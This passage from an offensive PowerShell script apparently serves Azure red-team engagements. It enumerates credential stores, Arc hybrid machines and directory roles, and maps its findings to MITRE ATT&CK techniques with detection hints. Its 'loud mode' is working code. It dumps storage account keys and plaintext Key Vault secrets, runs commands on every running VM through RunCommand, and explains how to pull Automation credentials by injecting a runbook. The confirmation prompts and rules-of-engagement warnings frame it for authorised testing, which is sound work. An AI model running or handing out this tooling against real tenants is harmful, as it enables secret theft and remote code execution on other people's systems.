        try { Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue | Out-Null } catch { continue }

        # --- Automation Account credential assets ---
        try {
            $aas = Get-AzResource -ResourceType "Microsoft.Automation/automationAccounts" -ErrorAction SilentlyContinue
            foreach ($aa in $aas) {
                $credsUrl = "https://management.azure.com$($aa.ResourceId)/credentials?api-version=2019-06-01"
                try {
                    $creds = Invoke-RestMethod -Uri $credsUrl -Headers $armHdr -Method GET -ErrorAction Stop
                    foreach ($c in $creds.value) {
                        $null = $Report.CredentialExposure.Add([PSCustomObject]@{
                            Subscription       = $sub.Name
                            ResourceType       = 'AutomationAccount/Credential'
                            ParentResource     = $aa.Name
                            CredentialName     = $c.name
                            UserName           = $c.properties.userName
                            Description        = $c.properties.description
                            LastModified       = $c.properties.lastModifiedTime
                            Severity           = 'High'
                            Notes              = 'Runbook credential asset - retrievable via Get-AutomationPSCredential inside a runbook.'
                        })
                    }
                } catch { }

                # Also list Automation variables (may contain secrets as plaintext strings)
                $varsUrl = "https://management.azure.com$($aa.ResourceId)/variables?api-version=2019-06-01"
                try {
                    $vars = Invoke-RestMethod -Uri $varsUrl -Headers $armHdr -Method GET -ErrorAction Stop
                    foreach ($v in $vars.value) {
                        $null = $Report.CredentialExposure.Add([PSCustomObject]@{
                            Subscription       = $sub.Name
                            ResourceType       = 'AutomationAccount/Variable'
                            ParentResource     = $aa.Name
                            CredentialName     = $v.name
                            UserName           = ''
                            Description        = $v.properties.description
                            LastModified       = $v.properties.lastModifiedTime
                            Severity           = if ($v.properties.isEncrypted) { 'Medium' } else { 'High' }
                            Notes              = if ($v.properties.isEncrypted) { 'Encrypted automation variable' } else { 'PLAINTEXT automation variable - may contain secrets' }
                        })
                    }
                } catch { }
            }
        } catch { }

        # --- Key Vault secret / key / cert NAMES (data-plane, names only) ---
        try {
            $kvs = Get-AzResource -ResourceType "Microsoft.KeyVault/vaults" -ErrorAction SilentlyContinue
            foreach ($kv in $kvs) {
                $kvName = $kv.Name
                # Try secrets
                try {
                    $secretNames = Get-AzKeyVaultSecret -VaultName $kvName -ErrorAction Stop
                    foreach ($s in $secretNames) {
                        $null = $Report.CredentialExposure.Add([PSCustomObject]@{
                            Subscription     = $sub.Name
                            ResourceType     = 'KeyVault/Secret'
                            ParentResource   = $kvName
                            CredentialName   = $s.Name
                            UserName         = ''
                            Description      = 'Secret name only (value NOT retrieved)'
                            LastModified     = $s.Updated
                            Severity         = 'High'
                            Notes            = 'KV secret - value requires Get-AzKeyVaultSecret with -AsPlainText (loud).'
                        })
                    }
                } catch { }
                try {
                    $keyNames = Get-AzKeyVaultKey -VaultName $kvName -ErrorAction Stop
                    foreach ($k in $keyNames) {
                        $null = $Report.CredentialExposure.Add([PSCustomObject]@{
                            Subscription     = $sub.Name
                            ResourceType     = 'KeyVault/Key'
                            ParentResource   = $kvName
                            CredentialName   = $k.Name
                            UserName         = ''
                            Description      = 'Crypto key name only'
                            LastModified     = $k.Updated
                            Severity         = 'Medium'
                            Notes            = 'KV key - cannot be exported unless exportable; used in wrap/unwrap/sign.'
                        })
                    }
                } catch { }
                try {
                    $certNames = Get-AzKeyVaultCertificate -VaultName $kvName -ErrorAction Stop
                    foreach ($c in $certNames) {
                        $null = $Report.CredentialExposure.Add([PSCustomObject]@{
                            Subscription     = $sub.Name
                            ResourceType     = 'KeyVault/Certificate'
                            ParentResource   = $kvName
                            CredentialName   = $c.Name
                            UserName         = ''
                            Description      = 'Certificate name only'
                            LastModified     = $c.Updated
                            Severity         = 'Medium'
                            Notes            = 'KV certificate - private key exportable in Get-AzKeyVaultSecret form.'
                        })
                    }
                } catch { }
            }
        } catch { }

        # --- AKS clusters with admin-cred endpoint ---
        try {
            $aks = Get-AzResource -ResourceType "Microsoft.ContainerService/managedClusters" -ErrorAction SilentlyContinue
            foreach ($c in $aks) {
                $null = $Report.CredentialExposure.Add([PSCustomObject]@{
                    Subscription     = $sub.Name
                    ResourceType     = 'AKS/AdminCredential'
                    ParentResource   = $c.Name
                    CredentialName   = 'listClusterAdminCredential'
                    UserName         = 'kubeconfig-admin'
                    Description      = 'AKS admin kubeconfig endpoint'
                    LastModified     = ''
                    Severity         = 'Critical'
                    Notes            = "Callable via POST https://management.azure.com$($c.ResourceId)/listClusterAdminCredential?api-version=2023-03-01 (loud)."
                })
            }
        } catch { }

        # --- App Services with publishing credentials enabled ---
        try {
            $apps = Get-AzResource -ResourceType "Microsoft.Web/sites" -ErrorAction SilentlyContinue
            foreach ($a in $apps) {
                $null = $Report.CredentialExposure.Add([PSCustomObject]@{
                    Subscription     = $sub.Name
                    ResourceType     = 'AppService/PublishingCreds'
                    ParentResource   = $a.Name
                    CredentialName   = 'publishxml'
                    UserName         = "`$$($a.Name)"
                    Description      = 'App Service publishing profile (FTP/deploy creds)'
                    LastModified     = ''
                    Severity         = 'High'
                    Notes            = "POST https://management.azure.com$($a.ResourceId)/publishxml?api-version=2023-01-01 pulls FTP+MSDeploy creds."
                })
            }
        } catch { }
    }

    Write-Host ("    [+] Credential exposure rows: {0}" -f $Report.CredentialExposure.Count) -ForegroundColor Green
}

# -----------------------------------------------------------------------------
# Enumerate-ArcHybridInventory  (menu option H)
#
# Azure Arc gives defenders and attackers alike an on-ramp INTO the hybrid /
# on-prem estate. Arc-connected machines have a Managed Identity and can
# execute runCommand via ARM, making them equivalent to Azure VMs for
# lateral movement purposes. This module inventories all Arc surfaces.
# -----------------------------------------------------------------------------
function Enumerate-ArcHybridInventory {
    Write-Host "`n[*] (H) Enumerating Azure Arc hybrid inventory..." -ForegroundColor Yellow

    $subs = Get-AllSubscriptions
    if (-not $subs) { Write-Host "    [!] No subscriptions." -ForegroundColor Red ; return }

    foreach ($sub in $subs) {
        try { Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue | Out-Null } catch { continue }

        # Arc-enabled servers
        try {
            $machines = Get-AzResource -ResourceType "Microsoft.HybridCompute/machines" -ExpandProperties -ErrorAction SilentlyContinue
            foreach ($m in $machines) {
                $props = $m.Properties
                $null = $Report.ArcMachines.Add([PSCustomObject]@{
                    Subscription   = $sub.Name
                    ResourceGroup  = $m.ResourceGroupName
                    Name           = $m.Name
                    OsName         = $props.osName
                    OsVersion      = $props.osVersion
                    ComputerName   = $props.displayName
                    Status         = $props.status
                    LastStatusChg  = $props.lastStatusChange
                    AgentVersion   = $props.agentVersion
                    MachineFQDN    = $props.machineFqdn
                    Domain         = $props.domainName
                    AD_ClientId    = $props.clientPublicKey
                    Location       = $m.Location
                    Notes          = 'Arc-connected - runCommand gives arbitrary code exec as SYSTEM / root.'
                })
            }
        } catch { }

        # Arc extensions (look for VM-Extensions that might enable code exec)
        try {
            $exts = Get-AzResource -ResourceType "Microsoft.HybridCompute/machines/extensions" -ErrorAction SilentlyContinue
            foreach ($e in $exts) {
                $null = $Report.ArcExtensions.Add([PSCustomObject]@{
                    Subscription   = $sub.Name
                    ResourceGroup  = $e.ResourceGroupName
                    ParentMachine  = ($e.ResourceId -split '/machines/')[1] -split '/' | Select-Object -First 1
                    ExtensionName  = $e.Name
                    Publisher      = $e.Properties.publisher
                    Type           = $e.Properties.type
                    Version        = $e.Properties.typeHandlerVersion
                    Location       = $e.Location
                })
            }
        } catch { }

        # Connected (Arc-enabled) Kubernetes
        try {
            $k8s = Get-AzResource -ResourceType "Microsoft.Kubernetes/connectedClusters" -ExpandProperties -ErrorAction SilentlyContinue
            foreach ($c in $k8s) {
                $props = $c.Properties
                $null = $Report.ArcKubernetes.Add([PSCustomObject]@{
                    Subscription    = $sub.Name
                    ResourceGroup   = $c.ResourceGroupName
                    Name            = $c.Name
                    Distribution    = $props.distribution
                    Infrastructure  = $props.infrastructure
                    KubernetesVersion = $props.kubernetesVersion
                    TotalNodes      = $props.totalNodeCount
                    ConnectivityStatus = $props.connectivityStatus
                    LastConnect     = $props.lastConnectivityTime
                    Location        = $c.Location
                    Notes           = 'Arc K8s - listClusterUserCredential pulls a kubeconfig.'
                })
            }
        } catch { }

        # SQL Server on Arc
        try {
            $sqlArc = Get-AzResource -ResourceType "Microsoft.AzureArcData/sqlServerInstances" -ExpandProperties -ErrorAction SilentlyContinue
            foreach ($s in $sqlArc) {
                $props = $s.Properties
                $null = $Report.ArcSqlInstances.Add([PSCustomObject]@{
                    Subscription   = $sub.Name
                    ResourceGroup  = $s.ResourceGroupName
                    Name           = $s.Name
                    Edition        = $props.edition
                    Version        = $props.version
                    HostMachineName = $props.containerResourceId
                    Status         = $props.status
                    LicenseType    = $props.licenseType
                    Location       = $s.Location
                    Notes          = 'SQL on Arc - reachable via hybrid-connected host.'
                })
            }
        } catch { }
    }

    Write-Host ("    [+] Arc machines: {0} | Extensions: {1} | K8s clusters: {2} | SQL instances: {3}" -f `
        $Report.ArcMachines.Count, $Report.ArcExtensions.Count, $Report.ArcKubernetes.Count, $Report.ArcSqlInstances.Count) -ForegroundColor Green
}

# -----------------------------------------------------------------------------
# Enumerate-LoudMode  (menu option L)
#
# *** FULL MICROBURST OFFENSIVE - GATED BEHIND DOUBLE CONFIRMATION ***
# This pulls actual secret values, storage keys, and automation credential
# values. It will light up Defender for Cloud, Azure Activity alerts, and
# KeyVault diagnostic logs. The operator must type YES-I-MEAN-IT to proceed.
#
# VM / App Service command execution is behind a SECOND confirmation.
# -----------------------------------------------------------------------------
function Enumerate-LoudMode {
    Write-Host ""
    Write-Host "################################################################" -ForegroundColor Red
    Write-Host "#                                                              #" -ForegroundColor Red
    Write-Host "#   !!! LOUD MODE - FULL MICROBURST OFFENSIVE CAPABILITIES !!! #" -ForegroundColor Red
    Write-Host "#                                                              #" -ForegroundColor Red
    Write-Host "#   This mode WILL:                                            #" -ForegroundColor Red
    Write-Host "#     - Retrieve STORAGE ACCESS KEYS (control-plane, logged)   #" -ForegroundColor Red
    Write-Host "#     - Retrieve KEY VAULT SECRET VALUES (data-plane, logged)  #" -ForegroundColor Red
    Write-Host "#     - Retrieve AUTOMATION CREDENTIAL VALUES via child runbook#" -ForegroundColor Red
    Write-Host "#     - Optionally EXECUTE COMMANDS on VMs / App Services      #" -ForegroundColor Red
    Write-Host "#                                                              #" -ForegroundColor Red
    Write-Host "#   It WILL generate Defender for Cloud / Sentinel alerts.     #" -ForegroundColor Red
    Write-Host "#   Only proceed if this run is in-scope per your ROE.         #" -ForegroundColor Red
    Write-Host "#                                                              #" -ForegroundColor Red
    Write-Host "################################################################" -ForegroundColor Red
    Write-Host ""
    $confirmation = Read-Host "Type 'YES-I-MEAN-IT' (exact) to proceed with loud mode"
    if ($confirmation -cne 'YES-I-MEAN-IT') {
        Write-Host "[!] Loud mode aborted - confirmation not given." -ForegroundColor Yellow
        return
    }

    $subs = Get-AllSubscriptions
    if (-not $subs) { Write-Host "    [!] No subscriptions." -ForegroundColor Red ; return }

    $armHdr = Get-ArmToken

    foreach ($sub in $subs) {
        try { Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue | Out-Null } catch { continue }

        # --- Storage account keys ---
        Write-Host "    [LOUD] Pulling storage account keys..." -ForegroundColor Red
        try {
            $accts = Get-AzResource -ResourceType "Microsoft.Storage/storageAccounts" -ErrorAction SilentlyContinue
            foreach ($a in $accts) {
                try {
                    $keysUrl = "https://management.azure.com$($a.ResourceId)/listKeys?api-version=2023-05-01"
                    $keys = Invoke-RestMethod -Uri $keysUrl -Headers $armHdr -Method POST -ErrorAction Stop
                    foreach ($k in $keys.keys) {
                        $null = $Report.LoudStorageKeys.Add([PSCustomObject]@{
                            Subscription   = $sub.Name
                            StorageAccount = $a.Name
                            KeyName        = $k.keyName
                            Permissions    = $k.permissions
                            Value          = $k.value
                            CreationTime   = $k.creationTime
                        })
                    }
                } catch {
                    $null = $Report.LoudStorageKeys.Add([PSCustomObject]@{
                        Subscription   = $sub.Name
                        StorageAccount = $a.Name
                        KeyName        = 'ERROR'
                        Permissions    = ''
                        Value          = $_.Exception.Message
                        CreationTime   = ''
                    })
                }
            }
        } catch { }

        # --- Key Vault SECRET VALUES ---
        Write-Host "    [LOUD] Pulling Key Vault secret values..." -ForegroundColor Red
        try {
            $kvs = Get-AzResource -ResourceType "Microsoft.KeyVault/vaults" -ErrorAction SilentlyContinue
            foreach ($kv in $kvs) {
                $vault = $kv.Name
                try {
                    $sl = Get-AzKeyVaultSecret -VaultName $vault -ErrorAction Stop
                    foreach ($s in $sl) {
                        try {
                            $val = Get-AzKeyVaultSecret -VaultName $vault -Name $s.Name -AsPlainText -ErrorAction Stop
                        } catch { $val = "[ERROR: $($_.Exception.Message)]" }
                        $null = $Report.LoudKeyVaultSecrets.Add([PSCustomObject]@{
                            Subscription = $sub.Name
                            Vault        = $vault
                            SecretName   = $s.Name
                            Value        = $val
                            ContentType  = $s.ContentType
                            Updated      = $s.Updated
                            Enabled      = $s.Enabled
                        })
                    }
                } catch {
                    $null = $Report.LoudKeyVaultSecrets.Add([PSCustomObject]@{
                        Subscription = $sub.Name
                        Vault        = $vault
                        SecretName   = 'ERROR'
                        Value        = $_.Exception.Message
                        ContentType  = ''
                        Updated      = ''
                        Enabled      = $false
                    })
                }
            }
        } catch { }

        # --- Automation Account credential VALUES via temporary runbook ---
        Write-Host "    [LOUD] Automation credential values (flag only - runbook injection skipped)..." -ForegroundColor Red
        # Rather than injecting an attacker runbook (destructive / ROE-sensitive),
        # we flag the automation credentials so the operator can choose to manually
        # run the child runbook themselves. This keeps the script from
        # autonomously modifying tenant-resident runbooks.
        try {
            $aas = Get-AzResource -ResourceType "Microsoft.Automation/automationAccounts" -ErrorAction SilentlyContinue
            foreach ($aa in $aas) {
                $credsUrl = "https://management.azure.com$($aa.ResourceId)/credentials?api-version=2019-06-01"
                try {
                    $creds = Invoke-RestMethod -Uri $credsUrl -Headers $armHdr -Method GET -ErrorAction Stop
                    foreach ($c in $creds.value) {
                        $null = $Report.LoudAutomationCreds.Add([PSCustomObject]@{
                            Subscription   = $sub.Name
                            AutomationAcct = $aa.Name
                            CredentialName = $c.name
                            UserName       = $c.properties.userName
                            ValueExtraction= 'MANUAL - inject a child runbook calling Get-AutomationPSCredential -Name ''' + $c.name + ''' and write to output stream.'
                            LastModified   = $c.properties.lastModifiedTime
                        })
                    }
                } catch { }
            }
        } catch { }
    }

    Write-Host ""
    $secondConfirm = Read-Host "Also execute commands on VMs / App Services? Type 'EXECUTE-CODE' (exact) to proceed, anything else to skip"
    if ($secondConfirm -cne 'EXECUTE-CODE') {
        Write-Host "[!] Skipping VM/App-Service command execution." -ForegroundColor Yellow
    } else {
        Write-Host "    [LOUD-EXEC] Running hostname + whoami on every running VM..." -ForegroundColor Red
        $vmCmd = 'hostname; whoami; echo Marker_T1526_MicroBurst'
        foreach ($sub in $subs) {
            try { Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue | Out-Null } catch { continue }
            try {
                $vms = Get-AzVM -Status -ErrorAction SilentlyContinue | Where-Object { $_.PowerState -match 'running' }
                foreach ($vm in $vms) {
                    $isLinux = ($vm.StorageProfile.OSDisk.OSType -eq 'Linux')
                    $cmdId = if ($isLinux) { 'RunShellScript' } else { 'RunPowerShellScript' }
                    $script = if ($isLinux) { @("hostname", "id", "echo Marker_T1526_MicroBurst") } else { @("hostname", "whoami", "echo Marker_T1526_MicroBurst") }
                    try {
                        $res = Invoke-AzVMRunCommand -ResourceGroupName $vm.ResourceGroupName -VMName $vm.Name -CommandId $cmdId -ScriptString ($script -join "`n") -ErrorAction Stop
                        $out = ($res.Value | ForEach-Object { $_.Message }) -join "`n"
                    } catch { $out = "[ERROR: $($_.Exception.Message)]" }
                    $null = $Report.LoudCommandExecution.Add([PSCustomObject]@{
                        Subscription   = $sub.Name
                        Target         = "VM/$($vm.Name)"
                        OSType         = $vm.StorageProfile.OSDisk.OSType
                        ResourceGroup  = $vm.ResourceGroupName
                        CommandId      = $cmdId
                        Output         = $out
                    })
                }
            } catch { }
        }
    }

    Write-Host ("    [+] LOUD - storage keys: {0} | KV secrets: {1} | automation creds flagged: {2} | command exec: {3}" -f `
        $Report.LoudStorageKeys.Count, $Report.LoudKeyVaultSecrets.Count, $Report.LoudAutomationCreds.Count, $Report.LoudCommandExecution.Count) -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# Build-MITREThreatMap
#
# Runs AFTER all Enumerate-* functions have finished. Produces a pivot/summary
# worksheet that ties each enumerated category back to the MITRE ATT&CK
# technique(s) it enables, with a live Count (and HighValueCount for
# sub-populations like "dangerous app perms" or "internet-exposed NSG rules").
#
# Columns (intended as a reviewer landing page):
#   Category           - human label
#   SourceWorksheet    - name of the sheet in this workbook with raw detail
#   Count              - total rows in that sheet
#   HighValueCount     - "juicy" subset count (dangerous, stale, exposed, etc.)
#   Severity           - Critical / High / Medium / Low / Info
#   MitreId            - ATT&CK technique id (e.g. T1526, T1098.003)
#   MitreTechnique     - technique name
#   Tactic             - ATT&CK tactic (Discovery, Privilege Escalation, etc.)
#   AttackerUseCase    - one-line "why a red teamer cares"
#   SuggestedDetection - short SOC hint
#   ReferenceURL       - MITRE ATT&CK reference link
# -----------------------------------------------------------------------------
function Build-MITREThreatMap {
    Write-Host "`n[*] Building MITRE ATT&CK threat map worksheet..." -ForegroundColor Yellow

    # Helper: safely resolve a live count for a sheet; returns 0 if missing / empty.
    $getCount = {
        param($sheetName)
        if ($Report.Contains($sheetName) -and $Report[$sheetName]) {
            return [int]$Report[$sheetName].Count
        }
        return 0
    }

    # Helper: count rows in a sheet that satisfy a scriptblock predicate.
    $getWhere = {
        param($sheetName, $predicate)
        if (-not $Report.Contains($sheetName) -or -not $Report[$sheetName] -or $Report[$sheetName].Count -eq 0) {
            return 0
        }
        return @($Report[$sheetName] | Where-Object $predicate).Count
    }

    # Each entry is one (data source -> ATT&CK technique) pairing. Some worksheets
    # map to multiple techniques; that's deliberate - a single data source (e.g.
    # StaleUsers) enables more than one attacker stage, and a reviewer looking for
    # "Valid Accounts" should find all sources that feed it.
    $rows = @(
        # --- Discovery -----------------------------------------------------------
        @{ Cat='Azure Subscriptions';           Sheet='Subscriptions';              HVCount=0;
           Sev='Info';     Id='T1526';     Tech='Cloud Service Discovery';                                Tac='Discovery';
           Use='Enumerates all subscriptions the identity can reach - primary T1526 deliverable.';
           Det='Azure Activity: Microsoft.Resources/subscriptions/read at abnormal volume from one principal.';
           Url='https://attack.mitre.org/techniques/T1526/' },
        @{ Cat='Resource Groups';               Sheet='ResourceGroups';             HVCount=0;
           Sev='Info';     Id='T1526';     Tech='Cloud Service Discovery';                                Tac='Discovery';
           Use='Maps resource-group layout across every subscription - narrows targeting.';
           Det='Graph / ARM read bursts to /resourceGroups from a single principal.';
           Url='https://attack.mitre.org/techniques/T1526/' },
        @{ Cat='Resources (ARM inventory)';     Sheet='Resources';                  HVCount=0;
           Sev='Info';     Id='T1580';     Tech='Cloud Infrastructure Discovery';                         Tac='Discovery';
           Use='Full ARM resource inventory - feeds every subsequent lateral move decision.';
           Det='Sentinel: high-volume Microsoft.Resources/resources/read.';
           Url='https://attack.mitre.org/techniques/T1580/' },
        @{ Cat='Resource Types Summary';        Sheet='ResourceTypesSummary';       HVCount=0;
           Sev='Info';     Id='T1580';     Tech='Cloud Infrastructure Discovery';                         Tac='Discovery';
           Use='Attack-surface fingerprint - tells the operator which services exist at scale.';
           Det='N/A (synthesized from Resources).';
           Url='https://attack.mitre.org/techniques/T1580/' },
        @{ Cat='Entra ID Users';                Sheet='Users';                      HVCount=0;
           Sev='Low';      Id='T1087.004'; Tech='Account Discovery: Cloud Account';                       Tac='Discovery';
           Use='Full user list - phishing target pool, password-spray candidate list.';
           Det='Graph audit: bulk /users reads from one app or identity.';
           Url='https://attack.mitre.org/techniques/T1087/004/' },
        @{ Cat='Entra ID Groups';               Sheet='Groups';                     HVCount=(& $getWhere 'Groups'  { $_.IsAssignableToRole -eq $true });
           Sev='Low';      Id='T1069.003'; Tech='Permission Groups Discovery: Cloud Groups';              Tac='Discovery';
           Use='Finds role-assignable (tier-0) groups - adding a member = directory role grant.';
           Det='Graph: /groups reads combined with isAssignableToRole=true filters.';
           Url='https://attack.mitre.org/techniques/T1069/003/' },
        @{ Cat='Public IP Addresses';           Sheet='PublicIPs';                  HVCount=0;
           Sev='Low';      Id='T1590.005'; Tech='Gather Victim Network Information: IP Addresses';        Tac='Reconnaissance';
           Use='External attack surface - management endpoints, exposed services, VPNs.';
           Det='ARM: /publicIPAddresses reads; external scanning against returned IPs.';
           Url='https://attack.mitre.org/techniques/T1590/005/' },

        # --- Initial Access ------------------------------------------------------
        @{ Cat='Guest Users (B2B)';             Sheet='GuestUsers';                 HVCount=(& $getWhere 'GuestUsers' { $_.AccountEnabled -eq $true });
           Sev='Medium';   Id='T1199';     Tech='Trusted Relationship';                                   Tac='Initial Access';
           Use='Enabled guests from external domains = persistent foothold outside your identity boundary.';
           Det='Entra audit: external user add events, risky-guest sign-ins, stale guest activity.';
           Url='https://attack.mitre.org/techniques/T1199/' },
        @{ Cat='Cross-Tenant Access Policies';  Sheet='CrossTenantAccess';          HVCount=0;
           Sev='Medium';   Id='T1199';     Tech='Trusted Relationship';                                   Tac='Initial Access';
           Use='B2B/B2C trust config - overly permissive inbound trusts broaden the blast radius.';
           Det='Entra audit: Update cross-tenant access policy events.';
           Url='https://attack.mitre.org/techniques/T1199/' },
        @{ Cat='Federation Settings';           Sheet='FederationSettings';         HVCount=0;
           Sev='High';     Id='T1484.002'; Tech='Domain or Tenant Policy Modification: Trust Modification'; Tac='Defense Evasion';
           Use='Federated domains / ADFS trusts - Golden SAML territory if an on-prem signer is owned.';
           Det='Entra audit: Set federation settings on domain / Update domain authentication.';
           Url='https://attack.mitre.org/techniques/T1484/002/' },

        # --- Persistence ---------------------------------------------------------
        @{ Cat='Guest Users (creation vector)'; Sheet='GuestUsers';                 HVCount=(& $getWhere 'GuestUsers' { $_.AccountEnabled -eq $true });
           Sev='Medium';   Id='T1136.003'; Tech='Create Account: Cloud Account';                          Tac='Persistence';
           Use='Self-invited guest users are a classic cloud persistence pattern.';
           Det='Entra audit: Invite external user / Add user events from non-IT identities.';
           Url='https://attack.mitre.org/techniques/T1136/003/' },
        @{ Cat='App Registrations';             Sheet='AppRegistrations';           HVCount=0;
           Sev='Medium';   Id='T1098.001'; Tech='Account Manipulation: Additional Cloud Credentials';     Tac='Persistence';
           Use='Apps are stealth identities - adding creds = silent, MFA-less persistence.';
           Det='Entra audit: Update application - Certificates and secrets management events.';
           Url='https://attack.mitre.org/techniques/T1098/001/' },
        @{ Cat='Service Principals';            Sheet='ServicePrincipals';          HVCount=(& $getWhere 'ServicePrincipals' { $_.IsFirstPartyMicrosoft -ne $true -and $_.AccountEnabled -eq $true });
           Sev='Medium';   Id='T1098.001'; Tech='Account Manipulation: Additional Cloud Credentials';     Tac='Persistence';
           Use='Third-party SPs with creds = long-lived non-user identities perfect for persistence.';
           Det='Entra audit: Add service principal credentials / Update service principal.';
           Url='https://attack.mitre.org/techniques/T1098/001/' },
        @{ Cat='App Credentials (secrets/certs)'; Sheet='AppCredentials';           HVCount=(& $getWhere 'AppCredentials' { $_.EndDateTime -and ([DateTime]$_.EndDateTime) -gt (Get-Date).AddYears(1) });
           Sev='High';     Id='T1098.001'; Tech='Account Manipulation: Additional Cloud Credentials';     Tac='Persistence';
           Use='Long-lived secrets/certs on apps and SPs - highest-value persistence artifact in a tenant.';
           Det='Entra audit: Add/Update application password or key credentials.';
           Url='https://attack.mitre.org/techniques/T1098/001/' },
        @{ Cat='App Federated Credentials';     Sheet='AppFederatedCredentials';    HVCount=0;
           Sev='Critical'; Id='T1606.002'; Tech='Forge Web Credentials: SAML Tokens';                     Tac='Credential Access';
           Use='Workload-identity federation (FIC) = passwordless, token-minting persistence from GitHub/any IdP.';
           Det='Entra audit: Add/Update federatedIdentityCredential on application.';
           Url='https://attack.mitre.org/techniques/T1606/002/' },
        @{ Cat='App Owners';                    Sheet='AppOwners';                  HVCount=0;
           Sev='Medium';   Id='T1098.001'; Tech='Account Manipulation: Additional Cloud Credentials';     Tac='Persistence';
           Use='Application owners can add their own creds - shadow-persistence via ownership.';
           Det='Entra audit: Add owner to application / Add owner to service principal.';
           Url='https://attack.mitre.org/techniques/T1098/001/' },
        @{ Cat='Container Registries';          Sheet='ContainerRegistries';        HVCount=0;
           Sev='Medium';   Id='T1525';     Tech='Implant Internal Image';                                 Tac='Persistence';
           Use='Push a backdoored image that downstream AKS/ACI workloads pull - supply-chain persistence.';
           Det='ACR audit: image push events from unusual principals or at unusual times.';
           Url='https://attack.mitre.org/techniques/T1525/' },

        # --- Privilege Escalation ------------------------------------------------
        @{ Cat='Directory Role Assignments';    Sheet='DirectoryRoleAssignments';   HVCount=(& $getWhere 'DirectoryRoleAssignments' { $_.RoleDisplayName -match 'Global Administrator|Privileged|Authentication Admin|Application Admin|Cloud Application Admin|User Admin|Groups Admin|Conditional Access Admin' });
           Sev='Critical'; Id='T1098.003'; Tech='Account Manipulation: Additional Cloud Roles';           Tac='Privilege Escalation';
           Use='Anyone holding a tier-0 directory role is a direct path to tenant takeover.';
           Det='Entra audit: Add member to role; PIM activation of privileged roles.';
           Url='https://attack.mitre.org/techniques/T1098/003/' },
        @{ Cat='PIM Eligible Role Assignments'; Sheet='PIMEligibleRoles';           HVCount=0;
           Sev='High';     Id='T1078.004'; Tech='Valid Accounts: Cloud Accounts';                         Tac='Privilege Escalation';
           Use='Eligible != active, but activation is one click - "dormant" privileged accounts.';
           Det='Entra audit: PIM role activation events outside change windows.';
           Url='https://attack.mitre.org/techniques/T1078/004/' },
        @{ Cat='Privileged (role-assignable) Groups'; Sheet='PrivilegedGroups';     HVCount=0;
           Sev='High';     Id='T1098.003'; Tech='Account Manipulation: Additional Cloud Roles';           Tac='Privilege Escalation';
           Use='isAssignableToRole groups - adding a member grants whatever directory role the group holds.';
           Det='Entra audit: Add member to group on role-assignable groups.';
           Url='https://attack.mitre.org/techniques/T1098/003/' },
        @{ Cat='Privileged Service Principals';  Sheet='PrivilegedServicePrincipals'; HVCount=0;
           Sev='Critical'; Id='T1098.003'; Tech='Account Manipulation: Additional Cloud Roles';           Tac='Privilege Escalation';
           Use='SPs holding directory roles - no MFA, no CA, token-driven tenant takeover vector.';
           Det='Entra audit: Add appRoleAssignment to service principal for directory roles.';
           Url='https://attack.mitre.org/techniques/T1098/003/' },
        @{ Cat='Dangerous App API Permissions';  Sheet='AppPermissions';            HVCount=(& $getWhere 'AppPermissions' { $_.IsDangerous -eq $true });
           Sev='Critical'; Id='T1098.003'; Tech='Account Manipulation: Additional Cloud Roles';           Tac='Privilege Escalation';
           Use='Apps with RoleManagement.ReadWrite.Directory / AppRoleAssignment.ReadWrite.All / full_access_as_app = tenant-level compromise via token.';
           Det='Entra audit: Consent to application + admin consent events for dangerous scopes.';
           Url='https://attack.mitre.org/techniques/T1098/003/' },
        @{ Cat='Azure RBAC Assignments';        Sheet='RbacAssignments';            HVCount=(& $getWhere 'RbacAssignments' { $_.RoleDefinitionName -match 'Owner|Contributor|User Access Administrator' });
           Sev='High';     Id='T1098.003'; Tech='Account Manipulation: Additional Cloud Roles';           Tac='Privilege Escalation';
           Use='Owner / User Access Administrator at any scope = "I can grant myself anything below this".';
           Det='Azure Activity: Microsoft.Authorization/roleAssignments/write at subscription or management-group scope.';
           Url='https://attack.mitre.org/techniques/T1098/003/' },
        @{ Cat='Custom RBAC Roles';             Sheet='CustomRoles';                HVCount=(& $getWhere 'CustomRoles' { ($_.Actions -match '\*') -or ($_.Actions -match 'Microsoft.Authorization/\*') });
           Sev='High';     Id='T1098.003'; Tech='Account Manipulation: Additional Cloud Roles';           Tac='Privilege Escalation';
           Use='Custom roles with wildcard or Authorization actions = hidden "god mode" roles.';
           Det='Azure Activity: Microsoft.Authorization/roleDefinitions/write reviewed against custom-role allowlist.';
           Url='https://attack.mitre.org/techniques/T1098/003/' },
        @{ Cat='Managed Identities';            Sheet='ManagedIdentities';          HVCount=0;
           Sev='Medium';   Id='T1078.004'; Tech='Valid Accounts: Cloud Accounts';                         Tac='Privilege Escalation';
           Use='Compromising a resource with an MI yields its role assignments - lateral/vertical movement with no creds.';
           Det='Azure Activity: role assignments granted to userAssignedIdentities at non-standard scope.';
           Url='https://attack.mitre.org/techniques/T1078/004/' },
        @{ Cat='Administrative Units';          Sheet='AdministrativeUnits';        HVCount=0;
           Sev='Medium';   Id='T1098.003'; Tech='Account Manipulation: Additional Cloud Roles';           Tac='Privilege Escalation';
           Use='Scoped role assignments - AU-scoped Authentication Admins can reset MFA for their scoped users.';
           Det='Entra audit: Add scoped member to role on AU; AU membership changes.';
           Url='https://attack.mitre.org/techniques/T1098/003/' },

        # --- Defense Evasion -----------------------------------------------------
        @{ Cat='Stale-but-Enabled Users';       Sheet='StaleUsers';                 HVCount=(& $getWhere 'StaleUsers' { $_.DaysStale -gt 180 });
           Sev='High';     Id='T1078.004'; Tech='Valid Accounts: Cloud Accounts';                         Tac='Defense Evasion';
           Use='Dormant but still-enabled accounts - password-spray candidates nobody will notice logging in.';
           Det='Entra sign-in logs: first successful sign-in after > 90 days inactivity.';
           Url='https://attack.mitre.org/techniques/T1078/004/' },
        @{ Cat='Classic (Co-)Administrators';   Sheet='ClassicAdmins';              HVCount=0;
           Sev='High';     Id='T1078.004'; Tech='Valid Accounts: Cloud Accounts';                         Tac='Defense Evasion';
           Use='Legacy co-admins = subscription owner equivalent that often bypasses modern RBAC review.';
           Det='Azure Activity: classic administrator operations, classicAdministrators list reads.';
           Url='https://attack.mitre.org/techniques/T1078/004/' },
        @{ Cat='Conditional Access Policies';   Sheet='ConditionalAccessPolicies';  HVCount=(& $getWhere 'ConditionalAccessPolicies' { $_.State -ne 'enabled' });
